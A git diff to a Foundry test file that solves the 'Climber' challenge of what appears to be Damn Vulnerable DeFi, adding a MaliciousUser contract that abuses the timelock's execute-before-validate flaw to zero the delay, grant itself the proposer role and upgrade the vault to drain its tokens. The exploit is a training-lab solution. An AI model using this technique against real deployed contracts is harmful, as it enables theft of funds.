@@ -7,6 +7,8 @@ import {ClimberVault} from "../../src/climber/ClimberVault.sol";
 import {ClimberTimelock, CallerNotTimelock, PROPOSER_ROLE, ADMIN_ROLE} from "../../src/climber/ClimberTimelock.sol";
 import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
 import {DamnValuableToken} from "../../src/DamnValuableToken.sol";
+import {AccessControl} from "@openzeppelin/contracts/access/AccessControl.sol";
+import {UUPSUpgradeable} from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 
 contract ClimberChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -43,7 +45,10 @@ contract ClimberChallenge is Test {
             address(
                 new ERC1967Proxy(
                     address(new ClimberVault()), // implementation
-                    abi.encodeCall(ClimberVault.initialize, (deployer, proposer, sweeper)) // initialization data
+                    abi.encodeCall(
+                        ClimberVault.initialize,
+                        (deployer, proposer, sweeper)
+                    ) // initialization data
                 )
             )
         );
@@ -85,7 +90,8 @@ contract ClimberChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_climber() public checkSolvedByPlayer {
-        
+        MaliciousUser attacker = new MaliciousUser(vault, token);
+        attacker.attack(recovery);
     }
 
     /**
@@ -93,6 +99,63 @@ contract ClimberChallenge is Test {
      */
     function _isSolved() private view {
         assertEq(token.balanceOf(address(vault)), 0, "Vault still has tokens");
-        assertEq(token.balanceOf(recovery), VAULT_TOKEN_BALANCE, "Not enough tokens in recovery account");
+        assertEq(
+            token.balanceOf(recovery),
+            VAULT_TOKEN_BALANCE,
+            "Not enough tokens in recovery account"
+        );
+    }
+}
+
+contract ClimberVault2 is ClimberVault {
+    function sweep(DamnValuableToken _token, address _receiver) public {
+        _token.transfer(_receiver, _token.balanceOf(address(this)));
+    }
+}
+
+contract MaliciousUser {
+    ClimberVault vault;
+    ClimberTimelock timelock;
+    DamnValuableToken token;
+
+    address[] targets;
+    uint256[] values;
+    bytes[] dataElements;
+
+    constructor(ClimberVault _vault, DamnValuableToken _token) {
+        vault = _vault;
+        token = _token;
+        timelock = ClimberTimelock(payable(vault.owner()));
+    }
+
+    function attack(address _recovery) public {
+        values = [0, 0, 0, 0];
+        targets = [
+            address(timelock),
+            address(timelock),
+            address(vault),
+            address(this)
+        ];
+        dataElements = [
+            abi.encodeCall(ClimberTimelock.updateDelay, (0)),
+            abi.encodeCall(
+                AccessControl.grantRole,
+                (PROPOSER_ROLE, address(this))
+            ),
+            abi.encodeCall(
+                UUPSUpgradeable.upgradeToAndCall,
+                (
+                    address(new ClimberVault2()),
+                    abi.encodeCall(ClimberVault2.sweep, (token, _recovery))
+                )
+            ),
+            abi.encodeCall(this.createSchedule, ())
+        ];
+
+        timelock.execute(targets, values, dataElements, 0);
+    }
+
+    function createSchedule() public {
+        timelock.schedule(targets, values, dataElements, 0);
     }
 }
